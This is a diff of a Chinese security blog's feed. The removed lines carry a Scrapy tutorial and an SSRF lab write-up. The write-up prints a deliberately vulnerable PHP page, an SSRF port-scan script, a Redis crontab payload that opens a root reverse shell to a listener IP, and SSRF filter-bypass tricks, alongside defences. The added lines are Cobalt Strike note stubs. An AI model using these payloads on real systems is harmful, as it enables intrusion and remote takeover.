-&lt;p&gt;命令运行后，会自动在当前目录下生成许多文件，如下所示：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;teamssix&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    │  scrapy.cfg  #scrapy的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    └─teamssix  #项目的Python模块，在这里写自己的代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  items.py  #项目定义文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  middlewares.py  #项目中间件文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  settings.py  #项目设置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        │  __init__.py&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ├─spiders  #在这里写爬虫代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        └─ __init__.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 1、简介与安装</title>
-    <link href="https://www.teamssix.com/year/191224-092208.html"/>
-    <id>https://www.teamssix.com/year/191224-092208.html</id>
-    <published>2019-12-24T01:22:08.000Z</published>
-    <updated>2019-12-24T02:30:15.756Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。</p><h3 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h3><p>Engine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。</p><a id="more"></a><h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>Scheduler 接收来自 Engine 的请求，并对请求进行排队，以便稍后在 Engine 请求时提供这些请求。</p><h3 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h3><p>Downloader 负责获取 web 页面内容并将其提供给 Engine，Engine 再将其提供给 Spiders。</p><h3 id="Spiders"><a href="#Spiders" class="headerlink" title="Spiders"></a>Spiders</h3><p>Spiders 是由 Scrapy 用户编写的自定义类，用于解析响应并从响应中提取所需要的内容。</p><h3 id="Item-Pipelines"><a href="#Item-Pipelines" class="headerlink" title="Item Pipelines"></a>Item Pipelines</h3><p>Item Pipelines 负责处理由 Spiders 提取的数据。典型的任务包括清理、验证和持久性(比如把数据存储在数据库中)。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy11.png" alt></p><p>1、Engine 从 Spiders 获取要爬行的初始请求。</p><p>2、Engine 在 Scheduler 中调度请求并请求爬行下一个请求。</p><p>3、Scheduler  将下一个请求返回给 Engine。</p><p>4、Engine 将请求发送给 Downloader，Downloader 对待请求网站进行访问。</p><p>5、Downloader 获取到响应后，将响应数据发送到 Engine。</p><p>6、Engine 接收来自 Downloader 的响应并将其发送到 Spiders 进行解析处理。</p><p>7、Spiders 处理响应后将解析到的数据发送给 Engine。</p><p>8、Engine 将处理过的数据发送到 Item Pipelines，然后将处理过的请求发送到 Scheduler，并请求爬行可能的下一个请求，该过程重复(从步骤1开始)，直到 Scheduler 不再发出请求为止。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>在安装 Scrapy 之前，建议先安装 Anaconda ，可以省去不少麻烦，Scrapy可以直接 pip 安装，值得注意的是，如果使用 Python2 开发，就需要使用 pip2 安装，使用 Python3 开发就需要使用 pip3 安装，安装命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>如果安装比较慢，可以指定国内安装源进行安装，下面的命令使用的清华源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>使用 -i 指定国内安装源后可以有效的提高下载速度。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;&lt;p&gt;下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。&lt;/p&gt;
-&lt;h3 id=&quot;Engine&quot;&gt;&lt;a href=&quot;#Engine&quot; class=&quot;headerlink&quot; title=&quot;Engine&quot;&gt;&lt;/a&gt;Engine&lt;/h3&gt;&lt;p&gt;Engine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【漏洞笔记】浅谈SSRF原理及其利用</title>
-    <link href="https://www.teamssix.com/year/191222-192227.html"/>
-    <id>https://www.teamssix.com/year/191222-192227.html</id>
-    <published>2019-12-22T11:22:27.000Z</published>
-    <updated>2019-12-22T12:31:07.697Z</updated>
-    
-    <content type="html"><![CDATA[<p>声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。</p><h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF1.png" alt></p><h1 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h1><p>上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？</p><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。</p><h1 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h1><p>既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。</p><p>可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。</p><p>具体可能出现SSRF的地方：</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p><p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/a.php?image=(地址)</span><br></pre></td></tr></table></figure><h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/ssrf.php?url=teamssix.com</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png" alt></p><p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p><p>打开Burp，抓包发到Intruder，设置Payload位置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF3.png" alt></p><p>将载荷类型设置为number，数字范围从1-65535，开始爆破</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF4.png" alt></p><p>根据响应长度及响应码，可以判断出80、3389是开放着的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF5.png" alt></p><h2 id="2、Weblogic漏洞复现"><a href="#2、Weblogic漏洞复现" class="headerlink" title="2、Weblogic漏洞复现"></a>2、Weblogic漏洞复现</h2><p>搭建环境参考：<a href="https://blog.csdn.net/qq_36374896/article/details/84102101" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84102101</a></p><p>搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。</p><h3 id="1、漏洞存在测试"><a href="#1、漏洞存在测试" class="headerlink" title="1、漏洞存在测试"></a>1、漏洞存在测试</h3><p>Weblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF6.png" alt></p><p>可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF7.png" alt></p><p>将 operator 参数值为改为其他URL，再次进行发包测试</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF8.png" alt></p><p>把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF9.png" alt></p><p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p><h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p><p>进入 redis服务 的shell，查看内网IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash</span><br><span class="line">[root@5d9f91f455b6 /]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  </span><br><span class="line">          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:129 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</span><br></pre></td></tr></table></figure><p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">data = <span class="string">'operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span>.format(port)</span><br><span class="line">r = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Tried all'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'\n\n[+] &#123;&#125; 发现端口\n\n'</span>.format(port))</span><br></pre></td></tr></table></figure><p>执行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~# python3 ssrf_portscan.py</span><br><span class="line">[+] 6379 发现端口</span><br></pre></td></tr></table></figure><p>通过扫描发现Redis服务的默认端口6373是开放的。</p><p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.0.2:6379/test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.10.30/4444 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png" alt></p><p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p><p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF11.png" alt></p><h1 id="0x05-绕过技巧"><a href="#0x05-绕过技巧" class="headerlink" title="0x05 绕过技巧"></a>0x05 绕过技巧</h1><p>1、添加端口号：<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>2、短网址绕过：<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><p>3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换</p><p>4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://</p><p>5、可以指向任意ip的域名：xip.io</p><p>6、@    <a href="http://abc@127.0.0.1" target="_blank" rel="noopener">http://abc@127.0.0.1</a></p><h1 id="0x06-SSRF防御"><a href="#0x06-SSRF防御" class="headerlink" title="0x06 SSRF防御"></a>0x06 SSRF防御</h1><p>1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。</p><p>3、限制请求的端口为http常用的端口,比如80,443,8080,8090</p><p>4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网</p><p>5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章<br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a><br><a href="http://www.liuwx.cn/penetrationtest-3.html" target="_blank" rel="noopener">http://www.liuwx.cn/penetrationtest-3.html</a><br><a href="https://www.cnblogs.com/yuzly/p/10903398.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10903398.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br><a href="https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。&lt;/p&gt;
-&lt;h1 id=&quot;0x00-漏洞说明&quot;&gt;&lt;a href=&quot;#0x00-漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞说明&quot;&gt;&lt;/a&gt;0x00 漏洞说明&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。&lt;/p&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
-      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】22、通过SSH开通通道</title>
+    <link href="https://www.teamssix.com/year/200419-150657.html"/>
+    <id>https://www.teamssix.com/year/200419-150657.html</id>
+    <published>2020-04-19T07:06:57.000Z</published>
+    <updated>2020-04-19T07:21:46.124Z</updated>
     
-      <category term="SSRF" scheme="https://www.teamssix.com/tags/SSRF/"/>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】21、反向转发通道的建立</title>
+    <link href="https://www.teamssix.com/year/200419-150651.html"/>
+    <id>https://www.teamssix.com/year/200419-150651.html</id>
+    <published>2020-04-19T07:06:51.000Z</published>
+    <updated>2020-04-19T07:21:42.298Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】20、通过Socks转发的方法</title>
+    <link href="https://www.teamssix.com/year/200419-150644.html"/>
+    <id>https://www.teamssix.com/year/200419-150644.html</id>
+    <published>2020-04-19T07:06:44.000Z</published>
+    <updated>2020-04-19T07:21:36.006Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】19、代码执行的方式</title>
+    <link href="https://www.teamssix.com/year/200419-150637.html"/>
+    <id>https://www.teamssix.com/year/200419-150637.html</id>
+    <published>2020-04-19T07:06:37.000Z</published>
+    <updated>2020-04-19T07:21:32.295Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】18、密码哈希散列设置信任</title>
+    <link href="https://www.teamssix.com/year/200419-150630.html"/>
+    <id>https://www.teamssix.com/year/200419-150630.html</id>
+    <published>2020-04-19T07:06:30.000Z</published>
+    <updated>2020-04-19T07:21:28.391Z</updated>
+    
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
+    
+      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【CS学习笔记】17、登陆验证的难点</title>
+    <link href="https://www.teamssix.com/year/200419-150622.html"/>
+    <id>https://www.teamssix.com/year/200419-150622.html</id>
+    <published>2020-04-19T07:06:22.000Z</published>
+    <updated>2020-04-19T07:21:24.737Z</updated>
+    
